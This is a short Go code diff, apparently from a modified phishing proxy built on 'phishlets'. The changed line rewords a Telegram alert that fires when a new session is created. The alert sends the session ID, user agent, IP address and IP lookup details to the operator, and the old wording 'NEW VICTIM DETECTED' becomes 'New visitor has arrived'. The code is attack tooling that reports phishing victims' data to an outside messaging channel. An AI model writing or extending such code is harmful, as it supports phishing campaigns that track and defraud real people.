@@ -78,7 +78,7 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		fmt.Print("error")
 	}
 
-	telegramSendVisitor(fmt.Sprintf("🔥 🔥 NEW  VICTIM DETECTED 🔥 🔥\n\n-🆔ID: %s \n\n🌎UserAgent: %s\n\n-🗺️IP: %s\n\n %s\n\n", sid, useragent, remote_addr, ipinfosn))
+	telegramSendVisitor(fmt.Sprintf("[ 🍁 [%s] New visitor has arrived 🍁 ]\n\n-🆔ID: %s \n******* [ 🧍‍♂️ Visitor Details 🧍‍♂️ ] *******\n🌎UserAgent: %s\n-🗺️IP: (%s)\n [%s]\n",phishlet, sid, useragent, remote_addr, ipinfosn))
 
 	err = d.db.Update(func(tx *buntdb.Tx) error {
 		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
